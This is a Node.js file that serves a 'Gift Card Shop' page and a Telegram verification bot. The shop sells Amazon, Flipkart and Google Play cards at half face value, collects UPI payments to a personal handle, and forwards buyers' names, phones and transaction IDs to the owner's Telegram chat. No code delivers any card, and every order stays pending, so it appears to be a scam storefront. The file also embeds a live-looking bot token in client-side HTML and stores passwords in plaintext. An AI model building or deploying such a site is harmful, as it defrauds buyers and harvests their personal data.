import http from 'http';

const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
const OWNER_ID = "8558052873";
const PORT = process.env.PORT || 3000;

// Complete HTML Website
const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Shop</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#0a0a2a,#0f0f3a);min-height:100vh;color:#fff;padding:20px;}
        .container{max-width:500px;margin:0 auto;}
        .card{background:rgba(255,255,255,0.1);border-radius:20px;padding:25px;margin-bottom:20px;border:1px solid #00ff88;}
        h2{color:#00ff88;margin-bottom:20px;text-align:center;}
        input{width:100%;padding:12px;margin:10px 0;background:#1a1a3a;border:1px solid #00ff88;border-radius:10px;color:#fff;font-size:16px;}
        button{width:100%;padding:14px;background:#00ff88;border:none;border-radius:10px;color:#0a0a2a;font-weight:bold;font-size:16px;cursor:pointer;margin-top:10px;}
        button.secondary{background:#333;color:#fff;}
        .platform-btn{display:inline-block;padding:10px 20px;margin:5px;background:#1a1a3a;border:1px solid #00ff88;border-radius:25px;cursor:pointer;}
        .platform-btn.active{background:#00ff88;color:#0a0a2a;}
        .gift-item{display:flex;justify-content:space-between;align-items:center;padding:15px;border-bottom:1px solid #333;cursor:pointer;}
        .gift-item:hover{background:#1a1a3a;}
        .gift-price{color:#00ff88;font-weight:bold;}
        .hidden{display:none;}
        .order-list{max-height:300px;overflow-y:auto;}
        .order-item{padding:12px;border-bottom:1px solid #333;font-size:14px;}
        .status-pending{color:#ffaa00;}
        .telegram-link{display:block;background:#0088cc;color:#fff;padding:12px;border-radius:10px;text-decoration:none;text-align:center;margin:15px 0;}
        .note{font-size:12px;color:#888;margin-top:10px;}
    </style>
</head>
<body>
<div class="container" id="app">

    <div id="loginSection">
        <div class="card">
            <h2>🔐 GIFT CARD SHOP</h2>
            <input type="tel" id="loginPhone" placeholder="Phone Number">
            <input type="password" id="loginPassword" placeholder="Password">
            <button onclick="login()">Login</button>
            <button onclick="showRegister()" class="secondary">New User? Register</button>
        </div>
    </div>

    <div id="registerSection" class="hidden">
        <div class="card">
            <h2>📝 REGISTER</h2>
            <input type="text" id="regName" placeholder="Full Name">
            <input type="tel" id="regPhone" placeholder="Phone Number">
            <input type="password" id="regPassword" placeholder="Password">
            <button onclick="register()">Register</button>
            <button onclick="showLogin()" class="secondary">Back to Login</button>
        </div>
    </div>

    <div id="botSection" class="hidden">
        <div class="card">
            <h2>🤖 VERIFY YOUR TELEGRAM</h2>
            <a href="https://t.me/Giftclerkbot" target="_blank" class="telegram-link">📱 Open @Giftclerkbot on Telegram</a>
            <p>Send <strong>/start</strong> to the bot and paste the code below:</p>
            <input type="text" id="botCode" placeholder="Enter code from bot">
            <button onclick="verifyCode()">Verify & Continue</button>
        </div>
    </div>

    <div id="shopSection" class="hidden">
        <div class="card">
            <h2>🛍️ Welcome, <span id="userNameDisplay"></span></h2>
            <div style="text-align:center;">
                <div class="platform-btn active" data-platform="amazon">Amazon</div>
                <div class="platform-btn" data-platform="flipkart">Flipkart</div>
                <div class="platform-btn" data-platform="googleplay">Google Play</div>
            </div>
            <div id="giftList"></div>
            <div style="margin-top:15px;">
                <input type="number" id="customAmount" placeholder="Custom amount (Min ₹50)" min="50">
                <button onclick="generateCustom()">Generate</button>
            </div>
            <div id="customPreview"></div>
            <button onclick="viewOrders()" class="secondary" style="margin-top:15px;">📦 My Orders</button>
            <button onclick="logout()" class="secondary" style="background:#ff4444;">Logout</button>
        </div>
    </div>

    <div id="ordersSection" class="hidden">
        <div class="card">
            <h2>📦 MY ORDERS</h2>
            <div id="ordersList" class="order-list"></div>
            <button onclick="backToShop()" class="secondary">Back to Shop</button>
        </div>
    </div>

    <div id="paymentSection" class="hidden">
        <div class="card">
            <h2>💳 COMPLETE PAYMENT</h2>
            <div id="paymentDetails"></div>
            <img id="qrImage" style="width:200px;margin:15px auto;display:block;">
            <p style="text-align:center;">UPI: <strong>ninadxclerk@fam</strong></p>
            <input type="text" id="utrNumber" placeholder="Enter UTR / Transaction ID">
            <button onclick="submitPayment()">Submit Payment</button>
            <button onclick="backToShop()" class="secondary">Cancel</button>
        </div>
    </div>

</div>

<script>
    const BOT_TOKEN = "${BOT_TOKEN}";
    const OWNER_ID = "${OWNER_ID}";
    
    let currentUser = null;
    let currentGift = null;
    let currentPlatform = "amazon";
    
    function calculatePrice(value) {
        let price = Math.ceil(value / 2);
        return price < 25 ? 25 : price;
    }
    
    const giftItems = {
        amazon: [50,100,200,500,1000,2000,5000].map(v => ({ name:"Amazon Gift Card", value:v, price:calculatePrice(v) })),
        flipkart: [50,100,200,500,1000,2000,5000].map(v => ({ name:"Flipkart Gift Card", value:v, price:calculatePrice(v) })),
        googleplay: [50,100,200,500,1000,2000].map(v => ({ name:"Google Play Code", value:v, price:calculatePrice(v) }))
    };
    
    function loadGifts() {
        const container = document.getElementById('giftList');
        container.innerHTML = '';
        giftItems[currentPlatform].forEach(item => {
            const div = document.createElement('div');
            div.className = 'gift-item';
            div.innerHTML = '<div>' + item.name + ' - ₹' + item.value + '</div><div class="gift-price">Pay: ₹' + item.price + '</div>';
            div.onclick = () => { currentGift = item; showPayment(); };
            container.appendChild(div);
        });
    }
    
    function generateCustom() {
        let amount = parseInt(document.getElementById('customAmount').value);
        if(!amount || amount < 50) { alert('Minimum ₹50'); return; }
        let price = calculatePrice(amount);
        document.getElementById('customPreview').innerHTML = '<div class="gift-item" onclick="currentGift={name:\'Custom\',value:'+amount+',price:'+price+'};showPayment();"><div>Custom - ₹'+amount+'</div><div class="gift-price">Pay: ₹'+price+'</div></div>';
    }
    
    function showPayment() {
        document.getElementById('paymentDetails').innerHTML = '<p><strong>'+currentGift.name+'</strong><br>Gift Value: ₹'+currentGift.value+'<br><span style="color:#00ff88;">You Pay: ₹'+currentGift.price+'</span></p>';
        document.getElementById('qrImage').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=ninadxclerk@fam&am='+currentGift.price;
        document.getElementById('shopSection').classList.add('hidden');
        document.getElementById('paymentSection').classList.remove('hidden');
    }
    
    function submitPayment() {
        let utr = document.getElementById('utrNumber').value;
        if(!utr) { alert('Enter UTR'); return; }
        let orders = JSON.parse(localStorage.getItem('orders_'+currentUser.phone) || '[]');
        orders.push({ id:Date.now(), item:currentGift.name, value:currentGift.value, price:currentGift.price, utr:utr, status:'pending', date:new Date().toISOString() });
        localStorage.setItem('orders_'+currentUser.phone, JSON.stringify(orders));
        fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:OWNER_ID,text:'🆕 NEW ORDER!\\nUser: '+currentUser.name+'\\nPhone: '+currentUser.phone+'\\nItem: '+currentGift.name+'\\nValue: ₹'+currentGift.value+'\\nPaid: ₹'+currentGift.price+'\\nUTR: '+utr})});
        alert('Payment submitted!');
        backToShop();
    }
    
    document.querySelectorAll('.platform-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            currentPlatform = btn.dataset.platform;
            loadGifts();
        };
    });
    
    function showRegister() { document.getElementById('loginSection').classList.add('hidden'); document.getElementById('registerSection').classList.remove('hidden'); }
    function showLogin() { document.getElementById('registerSection').classList.add('hidden'); document.getElementById('loginSection').classList.remove('hidden'); }
    
    function register() {
        let name = document.getElementById('regName').value;
        let phone = document.getElementById('regPhone').value;
        let password = document.getElementById('regPassword').value;
        if(!name || !phone || !password) { alert('Fill all fields'); return; }
        let users = JSON.parse(localStorage.getItem('users') || '{}');
        if(users[phone]) { alert('Phone already registered'); return; }
        users[phone] = { name, phone, password, telegramId: null };
        localStorage.setItem('users', JSON.stringify(users));
        alert('Registered! Please login.');
        showLogin();
    }
    
    function login() {
        let phone = document.getElementById('loginPhone').value;
        let password = document.getElementById('loginPassword').value;
        let users = JSON.parse(localStorage.getItem('users') || '{}');
        let user = users[phone];
        if(!user || user.password !== password) { alert('Invalid credentials'); return; }
        currentUser = user;
        document.getElementById('loginSection').classList.add('hidden');
        if(!user.telegramId) {
            document.getElementById('botSection').classList.remove('hidden');
        } else {
            document.getElementById('userNameDisplay').innerText = user.name;
            document.getElementById('shopSection').classList.remove('hidden');
            loadGifts();
        }
    }
    
    function verifyCode() {
        let code = document.getElementById('botCode').value;
        if(!code) { alert('Enter code from bot'); return; }
        fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/getUpdates').then(r=>r.json()).then(data=>{
            let found = false;
            if(data.ok && data.result) {
                for(let update of data.result) {
                    if(update.message && update.message.text === code) {
                        found = true;
                        currentUser.telegramId = update.message.chat.id;
                        let users = JSON.parse(localStorage.getItem('users') || '{}');
                        users[currentUser.phone].telegramId = update.message.chat.id;
                        localStorage.setItem('users', JSON.stringify(users));
                        break;
                    }
                }
            }
            if(found) {
                alert('Verified!');
                document.getElementById('botSection').classList.add('hidden');
                document.getElementById('userNameDisplay').innerText = currentUser.name;
                document.getElementById('shopSection').classList.remove('hidden');
                loadGifts();
            } else { alert('Invalid code. Send /start to @Giftclerkbot'); }
        });
    }
    
    function viewOrders() {
        let orders = JSON.parse(localStorage.getItem('orders_'+currentUser.phone) || '[]');
        let container = document.getElementById('ordersList');
        if(orders.length === 0) { container.innerHTML = '<p style="text-align:center;">No orders</p>'; }
        else { container.innerHTML = orders.reverse().map(o => '<div class="order-item"><strong>'+o.item+'</strong> - ₹'+o.value+'<br>Paid: ₹'+o.price+'<br>UTR: '+o.utr+'<br><span class="status-pending">Status: '+o.status+'</span></div>').join(''); }
        document.getElementById('shopSection').classList.add('hidden');
        document.getElementById('ordersSection').classList.remove('hidden');
    }
    
    function backToShop() {
        document.getElementById('paymentSection').classList.add('hidden');
        document.getElementById('ordersSection').classList.add('hidden');
        document.getElementById('shopSection').classList.remove('hidden');
    }
    
    function logout() {
        currentUser = null;
        document.getElementById('shopSection').classList.add('hidden');
        document.getElementById('paymentSection').classList.add('hidden');
        document.getElementById('ordersSection').classList.add('hidden');
        document.getElementById('botSection').classList.add('hidden');
        document.getElementById('loginSection').classList.remove('hidden');
    }
    
    loadGifts();
</script>
</body>
</html>`;

// Create HTTP server
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML);
});

// Telegram Bot Polling
let offset = 0;

async function telegram(method, payload) {
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
        return await res.json();
    } catch(e) { return { ok: false }; }
}

async function poll() {
    while (true) {
        try {
            const data = await telegram("getUpdates", { offset, timeout: 30 });
            if (data.ok && data.result) {
                for (const update of data.result) {
                    offset = update.update_id + 1;
                    if (update.message && update.message.text === '/start') {
                        const chatId = update.message.chat.id;
                        const code = `USER_${chatId}_${Date.now()}`;
                        await telegram("sendMessage", {
                            chat_id: chatId,
                            text: `🎫 YOUR VERIFICATION CODE:\n\n${code}\n\nCopy this code and paste it on the website to complete your order.\n\n⚠️ Valid for 10 minutes.`
                        });
                        console.log(`✅ Sent code to ${chatId}`);
                    }
                }
            }
        } catch(e) { console.log("Bot error:", e.message); }
        await new Promise(r => setTimeout(r, 2000));
    }
}

// Start both
server.listen(PORT, () => {
    console.log(`🌐 Website running on port ${PORT}`);
    console.log(`🤖 Bot is also running! Send /start to @Giftclerkbot`);
});
poll();